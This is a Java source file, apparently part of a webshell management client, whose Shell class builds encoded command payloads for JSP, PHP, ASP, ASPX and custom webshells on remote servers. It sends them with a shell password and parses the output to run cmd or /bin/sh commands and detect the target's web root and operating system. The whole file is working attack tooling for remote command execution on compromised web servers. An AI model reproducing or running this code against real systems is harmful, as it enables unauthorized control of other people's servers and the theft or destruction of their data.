package com.ms509.util;

import java.awt.Color;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Arrays;

import javax.swing.text.BadLocationException;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;

import sun.misc.BASE64Encoder;

public class Shell {
	// asp 命令执行
	private static String result[] = new String[2];
	private String pa = "";
	private String command = "";
	private int os = 0;
	private String code = "";
	private int type = 0;
	private String url = "";
	private String z1 = null;  //cmd 路径
	private String z2 = null;  //cmd 命令
	private String cus_z1 = "";//自定义cmd路径
	public Shell(int os, String url, String code, int type) {
		// TODO Auto-generated constructor stub
		this.url = url;
		this.os = os;
		// Safe.PASS = pass; //初始化密码
		this.code = code;
		this.type = type;
	}

	// set path
	public void SetPath(String path) {
		this.pa = path;
	}

	// 命令执行方法
	public String[] execute(String command) {
		String path_bak = pa;
		try {
			switch (type) {
			case 0:
				result = execute_jsp(command);
				break;
			case 1:
				result = execute_php(command);
				break;
			case 2:
				result = execute_asp(command);
				break;
			case 3:
				result = execute_aspx(command);
				break;
			case 4:
				result = execute_cus(command);
				break;
			}
		} catch (Exception e) {
			pa = path_bak;
			e.printStackTrace();
			result[0] = pa;
			result[1] = "";
		}

		return result;
	}

	// asp 命令执行
	private String[] execute_asp(String command) {

		String re[] = new String[2];
		

		switch (os) {

		case 1:
			z1 = "cmd";
			z2 = "cd" + " " + "/d" + " \"" + pa + "\"&" + command + "&echo [S]&cd&echo [E]";
			break;
		case 2:
			z1 = "/bin/sh";
			z2 = "cd" + " " + "\"" + pa + "\";" + command + ";echo [S];pwd;echo [E]";
			break;
		default:
			break;
		}
		z1 = CheckCMDPath(z1);
		z2 = z2.replace("\n", "");
		z2 = z2.replace("\r", "");

		String tmp = "";
		z1 = toHexString(z1);
		z2 = toHexString(z2);
		tmp = z1 + "&"+Safe.PARAM2+"=" + z2;
		String payload = Safe.ASP_SHELL.replace("PARAM1", Safe.PARAM1).replace("PARAM2", Safe.PARAM2);
		String make = Safe.ASP_MAKE.replace("PAYLOAD", toHexString(payload));
		String params = Safe.PASS + "=" + make + "&" + Safe.PARAM1 + "=" + tmp;
		String[] index_datas = Common.send(url, params, code).split("\t");
		try {
			re[0] = Arrays.toString(index_datas);
			re[0] = re[0].substring(re[0].indexOf("[") + 1, re[0].indexOf("[S]"));
			String path = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
					Arrays.toString(index_datas).indexOf("[E]"));
			re[1] = path;
		} catch (Exception e) {

		}
		//System.out.println(params);
		return re;
	}

	// aspx 命令执行
	private String[] execute_aspx(String command) {

		String re[] = new String[2];
//		String z1 = null;
//		String z2 = null;
		String tmp = "";
		String aspx_shell = Safe.ASPX_SHELL.replace("PARAM1", Safe.PARAM1).replace("PARAM2", Safe.PARAM2);
		String make = Safe.ASPX_MAKE.replace("PAYLOAD", aspx_shell);
		String params = null;

		switch (os) {

		case 1:
			z1 = "cmd";
			z2 = "cd" + " " + "/d" + " \"" + pa + "\"&" + command + "&echo [S]&cd&echo [E]";
			break;
		case 2:
			z1 = "/bin/sh";
			z2 = "cd" + " " + "\"" + pa + "\";" + command + ";echo [S];pwd;echo [E]";
			break;
		default:
			break;
		}
		z1 = CheckCMDPath(z1);
		z2 = z2.replace("\n", "");
		z2 = z2.replace("\r", "");
		try {
			tmp = URLEncoder.encode(z1, code) + "&"+Safe.PARAM2+"=" + URLEncoder.encode(z2, code);
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		params = Safe.PASS + "=" + make + "&" + Safe.PARAM1 + "=" + tmp;
		String[] index_datas = Common.send(url, params, code).split("\t");
		re[0] = Arrays.toString(index_datas);
		re[0] = re[0].substring(re[0].indexOf("[") + 1, re[0].indexOf("[S]"));
		String path = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
				Arrays.toString(index_datas).indexOf("[E]"));
		re[1] = path;
		return re;

	}
	
	// php 命令执行
	private String[] execute_php(String command) {
		String re[] = new String[2];
		//String z1 = null;
		//String z2 = null;
		String tmp = null;
		String params = null;
		switch (os) {
		case 1:
			z1 = "cmd";
			z2 = "cd" + "/d" + "\"" + pa + "\"&" + command + "&echo [S]&cd&echo [E]";
			break;
		case 2:
			z1 = "/bin/sh";
			z2 = "cd" + " " + "\"" + pa + "\";" + command + ";echo [S];pwd;echo [E]";
			break;
		default:
			break;
		}
		z1 = CheckCMDPath(z1);
		
		z2 = z2.replace("\n", "");
		z2 = z2.replace("\r", "");
		byte[] z12 = null;
		byte[] z22 = null;
		try {
			z12 = z1.getBytes("utf-8");
			z22 = z2.getBytes("utf-8");
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		tmp = (new BASE64Encoder().encode(z12)).toString() + "&"+Safe.PARAM2+"=" + (new BASE64Encoder().encode(z22)).toString();
		params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_SHELL, tmp);
		String[] index_datas = Common.send(url, params, code).split("\t");
		String result = null;
		result = Arrays.toString(index_datas);
		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf("[S]"));
		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
				Arrays.toString(index_datas).indexOf("[E]"));
		return re;
	}

	// jsp 命令执行
	private String[] execute_jsp(String command) {
		String re[] = new String[2];
//		String z1 = null;
//		String z2 = null;
		String tmp = null;
		String params = null;
		switch (os) {
		case 1:
			z1 = "/ccmd";
			z1 = CheckCMDPath(z1);
			if(!z1.equals("/ccmd"))
			{z1="/c"+z1;}
			z2 = "cd" + " " + "/d " + "\"" + pa + "\"&" + command + "&echo [S]&cd&echo [E]";
			break;
		case 2:
			z1 = "-c/bin/sh";
			z1 = CheckCMDPath(z1);
			if(!z1.equals("-c/bin/sh"))
			{z1="/c"+z1;}
			z2 = "cd" + " " + "\"" + pa + "\";" + command + ";echo [S];pwd;echo [E]";
			break;
		default:
			break;
		}
		
		z2 = z2.replace("\n", "");
		z2 = z2.replace("\r", "");
		byte[] z12 = null;
		byte[] z22 = null;
		try {
			z12 = z1.getBytes("utf-8");
			z22 = z2.getBytes("utf-8");
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		try {
			tmp = URLEncoder.encode(z1, code) + "&"+Safe.PARAM2+"=" + URLEncoder.encode(z2, code);
		} catch (UnsupportedEncodingException e2) {
			// TODO Auto-generated catch block
			e2.printStackTrace();
		}
		params = Common.makeParams(Safe.JSP_MAKE, Safe.JSP_SHELL, tmp);
		params = params + "&code=" + code;
		String[] index_datas = Common.send(url, params, code).split("\t");
		String result = null;
		result = Arrays.toString(index_datas);
		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf("[S]"));
		if(result.indexOf("[E]")+3<(result.length()-1))
		{
		String erroroutput = result.substring(result.indexOf("[E]") + 3, (result.length()-1));
		re[0] = re[0] + erroroutput;
		}
		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
				Arrays.toString(index_datas).indexOf("[E]"));
		return re;
	}
	private String[] execute_cus(String command) {
		String re[] = new String[2];

		String tmp = null;
		String params = null;
		switch (os) {
		case 1:
			z1 = "cmd";
			//z2 = "cd" + " " + "/d " + "\"" + pa + "\"&" + command + "&echo [S]&cd&echo [E]";
			break;
		case 2:
			z1 = "/bin/sh";
			//z2 = "cd" + " " + "\"" + pa + "\";" + command + ";echo [S];pwd;echo [E]";
			break;
		default:
			break;
		}
		z1 = CheckCMDPath(z1);
		z2 = command;
		z2 = z2.replace("\n", "");
		z2 = z2.replace("\r", "");
		//params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_SHELL,URLEncoder.encode(z1),URLEncoder.encode(z2),URLEncoder.encode(pa));
		params = Safe.PASS+"=1&"+Safe.ACTION+"="+Safe.CUS_SHELL+"&"+Safe.PARAM1+"="+URLEncoder.encode(z1)+"&"+Safe.PARAM2+"="
		+URLEncoder.encode(z2)+"&"+Safe.PARAM3+"="+URLEncoder.encode(pa);
		String[] index_datas = Common.send(url, params, code).split("\t");
		String result = Arrays.toString(index_datas);
		String spl = Safe.CUS_SHELL_SPL;
		String spr = Safe.CUS_SHELL_SPR;
		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf(spl));
		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf(spl) + spl.length(),
				Arrays.toString(index_datas).indexOf(spr));
		return re;
	}
	
	
	
	public void SetCMD(String cmdpath)
	{
		cus_z1 = cmdpath;
	}
	public String CheckCMDPath(String z) //检查cmd是否有自定义路径
	{
		if(cus_z1.equals(""))
		{
			return z;
		}else
		{
			return cus_z1;
		}
	}
	public String GetPath() {
		String path = "";
		String path_index = "";
		String params = "";
		//System.out.println(type);
		try {
			switch (type) {
			case 0:
				params = Common.makeParams(Safe.JSP_MAKE, Safe.JSP_INDEX) + "&code=" + this.code;
				break;
			case 1:
				params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_INDEX);
				break;
			case 2:
				String tmp = Safe.ASP_MAKE;
				path_index = tmp.replace("PAYLOAD", Safe.ASP_INDEX);
				params = Safe.PASS + "=" + path_index;
				break;
			case 3:
				path_index = Safe.ASPX_MAKE.replace("PAYLOAD", Safe.ASPX_INDEX);
				try {
					params = Safe.PASS + "=" + URLEncoder.encode(path_index, code);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				break;
			case 4: //cus模式
				//path_index = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_INDEX);			
				params = Safe.PASS + "=1&action="+Safe.CUS_SHELL+"&"+Safe.PARAM1+"="+"&"+Safe.PARAM2+"=";
				break; 
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		String[] index_datas = Common.send(url, params, code).split("\t");
		String webroot = index_datas[0];
		pa = webroot;
		if (webroot.contains(":")) // windows系统
		{
			Safe.SYSTEMSP = "\\";
			if (!pa.substring(pa.length() - 1, pa.length()).equals("\\")) {
				pa = pa + "\\";
			}
			if(pa.indexOf("HTTP/1.")<0)
			{
				pa = pa.replace("/", "\\");
			}
			//pa = pa +"";
			os = 1;
			z1 = "cmd"; //设置cmd初始化路径
		} else // linux系统
		{

			// String[] tmp = webroot.split("/");
			Safe.SYSTEMSP = "/";
			if (!pa.substring(pa.length() - 1, pa.length()).equals("/")) {
				pa = pa + "/";
			}
			pa = pa.replace("\t", "");
			//pa = "["+pa+"]$";
			os = 2;
			z1 = "/bin/sh";  //设置cmd初始化路径
		}
		SimpleAttributeSet a = new SimpleAttributeSet();
		StyleConstants.setForeground(a, Color.WHITE);
		StyleConstants.setFontSize(a, 10);
		return pa;

	}

	// 16进制 转换
	private String toHexString(String s) {
		String str = "";
		try {
			byte[] b = s.getBytes(code);
			// String k = new String(b,"GBK");
			// byte[] b = k.getBytes();
			// String str = " ";
			for (int i = 0; i < b.length; i++) {
				Integer I = new Integer(b[i]);
				String strTmp = I.toHexString(b[i]);
				// System.out.println(strTmp.length());
				if (strTmp.length() > 2)
					strTmp = strTmp.substring(strTmp.length() - 2);
				str = str + strTmp;
			}
			// System.out.println(str.toUpperCase());
		} catch (Exception e) {
			e.printStackTrace();
		}
		return str;
	}
	//
}